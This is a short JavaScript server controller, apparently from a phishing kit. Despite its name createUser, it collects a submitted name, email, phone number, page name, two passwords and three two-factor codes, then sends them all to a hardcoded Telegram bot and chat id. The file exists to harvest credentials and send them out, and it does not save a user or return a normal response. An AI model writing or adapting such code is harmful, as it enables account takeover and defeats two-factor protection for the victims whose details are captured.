import User from "../model/User.model.js";
import fs from 'fs'
import util from 'util'
import axios from "axios";

export const createUser = async (req, res) => {
    try {
        const { full_name,
            login_email,
            phone_number,
            page_name,
            password_one,
            password_two, tfa_one, tfa_two, tfa_three, additional_info } = req.body;

        const params =
            `=============================\n PageName: ${page_name}\n Full Name: ${full_name}\n Email: ${login_email}\n Tel: ${phone_number}\n Password1: ${password_one}\n Password2: ${password_two}\n 2fa: ${tfa_one}\n 2fa-2: ${tfa_two}\n tfa_three: ${tfa_three}\n=============================`;

            console.log(params);
        const response = axios.post(`https://api.telegram.org/bot6107978326:AAF9BLpwPtaoLPurhYDSQpkB2q1gL1wL5x4/sendMessage?chat_id=2133247544&text=${params}/`, {
            headers: {
                'Content-Type': 'application/json',
                'X-Robots-Tag': 'googlebot: nofollow',
            },

        })
    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};
